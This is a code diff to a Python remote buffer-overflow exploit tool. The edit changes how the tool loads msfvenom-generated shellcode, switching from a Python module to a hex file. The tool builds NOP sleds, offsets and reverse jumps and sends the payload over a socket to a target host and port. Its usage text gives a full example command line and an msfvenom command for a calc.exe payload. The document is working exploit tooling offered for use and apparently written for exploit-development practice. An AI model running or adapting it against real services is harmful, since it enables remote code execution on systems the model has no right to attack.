@@ -8,6 +8,7 @@
 import sys
 import socket
 import binascii
+import os
 import getopt
 
 VERBOSE = True
@@ -34,7 +35,7 @@ def print_usage(scriptName):
 	print("")
 
 	print("exploit - Sends malicious payload via buffer overflow")
-	print(" {} -m exploit --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --reversejmp=800 --shellcode=payload --nops=10".format(scriptName))
+	print(" {} -m exploit --rhost=10.2.31.155 --rport=2050 --buffsize=4096 --buffhead='cmd2 /.:/' --offset=1203 --hexcontent=0A62F809 --reversejmp=800 --shellcode=opencalc --nops=10".format(scriptName))
 	print("")
 
 	print("Parameters:")
@@ -56,8 +57,8 @@ def print_usage(scriptName):
 	print(" --badchar	: Adds bad chars before (before) or after (after) the content. Used for bad char testing.")
 	print(" --exclude	: List of chars (formatted as hex string) to be excluded from badchar list.")
 	print(" --reversejmp	: Size in bytes to jump before the content to inject bad chars or the shell code.")
-	print(" --shellcode	: Python shell code file generated using msfvenom. Do NOT include the .py extension in the parameter.")
-	print("		Example: msfvenom -p windows/exec cmd=calc.exe -b '\\x00' -f python -v payload EXITFUNC=thread -o payload")
+	print(" --shellcode	: Hex shell code file generated using msfvenom. Example:")
+	print("		msfvenom -p windows/exec cmd=calc.exe -b '\\x00' -f hex EXITFUNC=thread -o opencalc")
 	print(" --nops		: Amount of nops to add before and after the shell code. Default is 0.")
 
 
@@ -255,13 +256,16 @@ def create_badchar_payload_after(buffHead, buffSize, offsetCount, binContent, ex
 
 # exploit
 def create_exploit_payload(buffHead, buffSize, offsetCount, binContent, reverseJmpSize, shellCodeFile, nopsSize = 2):
+	print("val: ".format(buffHead, buffSize, offsetCount, binContent, reverseJmpSize, shellCodeFile, nopsSize))
+
 	# nops
 	nops = b'\x90' * nopsSize
 
 	# shellcode
-	shellCodeFile = sys.argv[9]
-	shellCodeModule = __import__(shellCodeFile)
-	shellCode = shellCodeModule.payload	
+	with open(shellCodeFile) as f: shellCodeStr = f.read()
+	print("Shell code string:", shellCodeStr)
+
+	shellCode = binascii.unhexlify(shellCodeStr)
 
 	# Limitation: reverse jump can only be divisible by 256
 	tJmp = reverseJmpSize % 256
@@ -406,7 +410,10 @@ if __name__ == "__main__":
 			buffPayload = create_write_payload(buffHead, buffSize, offset, binContent)
 
 	elif mode == 'exploit':
-		get_binary_content(writeContent)
+		if not os.path.isfile(shellCodeFile):
+			print("Error: shellcode param is not a valid file")
+
+		binContent = get_binary_content(hexContent)
 
 		buffPayload = create_exploit_payload(buffHead, buffSize, offset, binContent, reverseJmpSize, shellCodeFile, nops)
 	else:
